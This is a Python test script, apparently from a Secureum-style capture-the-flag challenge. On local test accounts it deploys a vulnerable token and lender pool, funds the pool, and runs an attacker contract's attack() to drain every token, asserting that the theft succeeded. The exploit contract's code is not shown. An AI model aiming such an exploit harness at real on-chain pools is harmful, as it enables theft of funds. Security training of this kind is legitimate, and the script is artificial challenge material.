from ape import accounts, project
from .utils.helper import w3

TOKENS_IN_POOL = w3.to_wei(10, "ether")


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    # deploy token
    print("\n--- Deploying Secureum Token and Lender Pool ---\n")
    token = project.InSecureumToken.deploy(TOKENS_IN_POOL, sender=deployer)
    pool = project.InSecureumLenderPool.deploy(token.address, sender=deployer)

    # fund pool with tokens
    print("\n--- Funding Lender Pool with Tokens ---\n")
    token.transfer(pool.address, TOKENS_IN_POOL, sender=deployer)
    assert token.balanceOf(pool.address) == TOKENS_IN_POOL

    # define initial balances for attacker and lender pool
    attacker_initial_bal = token.balanceOf(attacker.address) / 10**18
    pool_initial_bal = token.balanceOf(pool.address) / 10**18

    print(
        f"\n--- \nInitial Balances:\n⇒ Attacker: {attacker_initial_bal}\n⇒ Pool: {pool_initial_bal}\n---\n"
    )

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.LenderPoolAttacker.deploy(
        pool.address,
        sender=attacker,
    )
    attacker_contract.attack(sender=attacker)

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: Attacker stole all tokens from the pool ---\n")

    # define ending balances for attacker and vitalik
    attacker_final_bal = token.balanceOf(attacker.address) / 10**18
    pool_final_bal = token.balanceOf(pool.address) / 10**18

    print(
        f"\n--- \nFinal Balances:\n⇒ Attacker: {attacker_final_bal}\n⇒ Pool: {pool_final_bal}\n---\n"
    )

    assert token.balanceOf(pool.address) == 0
    assert token.balanceOf(attacker.address) == TOKENS_IN_POOL

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
